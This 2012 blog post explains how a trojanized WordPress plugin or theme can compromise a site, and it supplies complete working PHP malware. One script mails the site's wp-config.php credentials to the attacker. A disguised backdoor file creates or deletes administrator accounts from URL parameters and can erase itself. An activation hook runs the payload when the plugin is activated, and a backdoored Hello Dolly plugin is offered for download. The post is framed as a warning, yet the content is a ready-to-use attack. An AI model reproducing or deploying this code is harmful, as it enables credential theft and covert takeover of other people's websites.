---
date: '2012-07-04 11:11:42'
title: How a wordpress plugin or theme hack your site
---

I’ve been using wordpress for a few months, it’s such a powerful and enjoyable tool to me. I use it both for blogging and building websites. Themes and plugins are two important aspects that make wordpress great and I can never spend enough time exploring them. Gradually however, I learnt that I shouldn’t download and install them so freely without considering whether their sources are safe or not. In order to better understand how easy it is for a third-party theme/plugin to hack my website, I myself, wrote a hacking script. And to my greatest surprise, it works!

All you need to do is to put a nine-line code and two tiny php files into a theme or plugin, then once the website owner click “Activate”, it’s done. The script is able to hide itself, moreover uninstalling the theme/plugin won’t save the website owner. You’ll see how it works below.

The script I wrote mainly has two functions:

One is to send website’s wp-config.php file to hacker’s mailbox, so the hacker knows a new website just got hacked, meanwhile, wp-config.php contains some information which can be quite useful（some people use same password for both database and wordpress account, not a good idea – - ）

The other function is to leave a backdoor for the hacker to control the website whenever he wants. For example, if carelessblogger.com is hacked by this script, anyone can type “[carelessblogger.com/wp-cong.php?s=hack&w=hack](http://carelessblogger.com/wp-cong.php?s=hack&w=hack)” at browser’s address bar, press enter, then an admin-role account with username “hack” and password “hack” is created. People can use this account to log into the website with admin power. After stealing information, they can then type “[carelessblogger.com/wp-cong.php?s=hack](http://carelessblogger.com/wp-cong.php?s=hack)” again to delete this account so that their trace won’t be found. Moreover, typing “[carelessblogger.com/wp-cong.php?s=hack&t=disappear](http://carelessblogger.com/wp-cong.php?s=hack&t=disappear)” will delete the backdoor script itself. (it doesn’t have to be “disappear”, anything but “0″ will do, the file-deleting command only works while deleting the user, it’s designed this way in case you delete the file but forget to delete the user you just created.)

The above two functions are put into two different files:

 

The email notification function is put in a file called “email.php” :  
<pre><code> 
 //revised from Jim Plush’s HTML EMAIL WITH JPEG ATTACHMENTS TUTORIAL  
 function email_notification()  {

$theurl = (!empty($_SERVER['HTTPS'])) ? “https://”.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : “http://”.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];

$to = ‘youremail@email.com’;  
 $subject = ‘A new site is hacked : P’ ;  
 $bound_text = “whateverdoesntmatter”;  
 $bound = “–”.$bound_text.”\r\n”;  
 $bound_last = “–”.$bound_text.”–\r\n”;

$headers = “From: $theurl \r\n”;  
 $headers .= “MIME-Version: 1.0\r\n”  
 .”Content-Type: multipart/mixed; boundary=\”$bound_text\””;

$message .= “MIME not accepted!\r\n”  
 .$bound;

$message .= “Content-Type: text/html; charset=\”iso-8859-1\”\r\n”  
 .”Content-Transfer-Encoding: 7bit\r\n\r\n”  
 .”Life is ilke a boat: )\r\n”  
 .$bound;

$file = file_get_contents(“../../../wp-config.php”);

$message .= “Content-Type: image/jpg; name=\”wp-config.php\”\r\n”  
 .”Content-Transfer-Encoding: base64\r\n”  
 .”Content-disposition: attachment; file=\”wp-config.php\”\r\n”  
 .”\r\n”  
 .chunk_split(base64_encode($file))  
 .$bound_last;

mail($to, $subject, $message, $headers);

}

function create_file()  {

$theurl = (!empty($_SERVER['HTTPS'])) ? “https://”.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : “http://”.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];

$gotourl = substr($theurl,0,-40) . ‘wp-admin/plugins.php’ ;

email_notification();  
 rename(‘backdoor.php’, ‘../../../wp-cong.php’);  
 unlink(‘email.php’);  
 header(‘Location: ‘ . $gotourl);

}

create_file();

</code></pre>  
 The backdoor function is put into a file called “backdoor.php” : 
 
<pre><code>

require_once(‘wp-blog-header.php’);  
require_once(‘wp-admin/includes/user.php’);  
require_once(‘wp-includes/load.php’);

$newusername = $_GET["s"];  
$newpassword = $_GET["w"];

// Check that user doesn’t already exist  
 if ( !username_exists($newusername) )  
 {  
 // Create user and set role to administrator  
 $user_id = wp_create_user( $newusername, $newpassword);  
 if ( is_int($user_id) )  
 {  
 $wp_user_object = new WP_User($user_id);  
 $wp_user_object->set_role(‘administrator’);  
 echo ‘user created!’;  
 }  
 else {  
 echo ‘Error. Not created.’;  
 }  
 }  
 else {  
 $user_id = username_exists( $newusername );

wp_delete_user( $user_id);  
 echo ‘user deleted!’;

if ($_GET["t"]){  
 unlink(‘wp-cong.php’);  
 echo ‘file deleted!’;

}

}

</code></pre>  
 Finally, I put the following code into the main php file of the original theme/plugin (this example is for a plugin):  
<pre><code>  
 register_activation_hook(__FILE__, ‘my_plugin_activate’);  
 add_action(‘admin_init’, ‘my_plugin_redirect’);  
 function my_plugin_activate() {  
 add_option(‘my_plugin_do_activation_redirect’, true);}  
 function my_plugin_redirect() {  
 if (get_option(‘my_plugin_do_activation_redirect’, false)) {  
 delete_option(‘my_plugin_do_activation_redirect’);  
 wp_redirect(home_url().’/wp-content/plugins/pluginname/email.php’);}  
 }  
</code></pre>

All done! The theme/plugin’s original function won’t be affected at all and neither email.php and backdoor.php can be found in theme/plugin folder after “Activate” is pressed so that the website owner won’t be able to pinpoint which theme/plugin did it. “Email.php” is deleted permanently and “backdoor.php” is moved to the root, name changed to “wp-cong.php” (name is changed so because I feel it might be a little bit harder to be found among “wp-comments-post.php”, “wp-config-sample.php”， “wp-config.php”， “wp-cron.php“)

If the website owner read codes very carefully then he/she might be able to find the above nine lines of code, and that’s all he/she can find.

My conclusion of this tiny experiment is that even a newbie can make a  malicious theme/plugin to fully take control of your site easily, so If you happen to read this post, I hope you’ll be more aware of the dangerous of using third-party themes/plugins and never attempt to hack others’ website (IT’S ILLEGAL, DON’T DO IT!). And if the later happens unfortunately, I won’t take any responsibility.

Here is an example using Hello Dolly plugin (remember to change youremail@email.com to your own email and you can only use it for yourself)

[Download](/content/images/uploads/2012/09/hello-dolly.zip "hello dolly with backdoor")

 


